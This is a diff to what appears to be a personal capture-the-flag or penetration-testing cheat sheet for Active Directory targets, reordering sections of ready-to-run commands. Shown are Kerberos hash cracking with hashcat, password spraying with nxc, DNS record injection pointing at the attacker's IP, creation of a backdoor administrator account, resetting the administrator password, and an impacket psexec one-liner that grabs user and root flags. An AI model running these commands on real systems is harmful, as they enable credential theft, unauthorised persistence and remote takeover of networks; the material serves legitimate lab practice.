@@ -148,6 +148,14 @@ echo '$krb5pa$18$<CNameString>$<realm>$<cipher>' > hashes; hashcat hashes $rocky
 echo -n '6b,cf,2a,4b,6e,5a,ca,0f' | xxd -r -p | openssl enc -des-cbc -nopad -nosalt -K e84ad660c4721ae0 -iv 0000000000000000 -d
 echo -n 'cGFzc3dvcmRpc2dvb2Q=' | base64 -d
 
+## Sorting Lists
+cat usernames | sort -u | tee usernames
+cat passwords | sort -u | tee passwords
+
+## Decompressing
+tar -xzvf backup.tar.gz -C .
+unzip backup.zip -d .
+
 ## Spray Services
 (
 (nxc smb "$TARGET" -u usernames -p passwords --continue-on-success &)
@@ -172,25 +180,17 @@ dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP 
 dnstool.py $TARGET -u '$DOM\$USERNAME' -p '$PASSWORD' --action add --data $MYIP --record 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA'
 impacket-smbclient -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass
 
-## Create an Administrator Account
-net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
-
-## Change Administrator Password
-net user administrator 123qweasdF!
-
-## GG - ROOT FLAG
-U=administrator;impacket-getTGT -dc-ip $TARGET $DOM/"$U":'123qweasdF!'; export KRB5CCNAME=`pwd`/"$U".ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -vE '\[|-' | xargs -n1 | xargs -I{} gg {}
-
 ## Create Custom Usernames
 username-anarchy --input-file usernames --select-format first,flast,f.last,first.last,firstlast > .tmp; cat .tmp | tee usernames; rm .tmp
 
-## Sort Files
-cat usernames | sort -u | tee usernames
-cat passwords | sort -u | tee passwords
+## Create an Administrator Account
+net user myadmin 123qweasdF! /add && net localgroup Administrators myadmin /add
 
-## Decompress Files
-tar -xzvf backup.tar.gz -C .
-unzip backup.zip -d .
+## GG - ROOT FLAG
+net user administrator 123qweasdF!
+U=administrator;impacket-getTGT -dc-ip $TARGET $DOM/"$U":'123qweasdF!'; export KRB5CCNAME=`pwd`/"$U".ccache; impacket-psexec -dc-ip $TARGET -target-ip $TARGET $DC -k -no-pass "cmd /c @for /d %u in (C:\\Users\\*) do @type \"%u\\Desktop\\user.txt\" 2>nul & @type \"%u\\Desktop\\root.txt\" 2>nul" | grep -vE '\[|-' | xargs -n1 | gg
+Get-ChildItem 'C:\Users' -Directory | ForEach-Object { Get-Content "$($_.FullName)\Desktop\user.txt","$($_.FullName)\Desktop\root.txt" -ErrorAction SilentlyContinue }
+gg ''
 
 ## Web
 [*] Web Shell
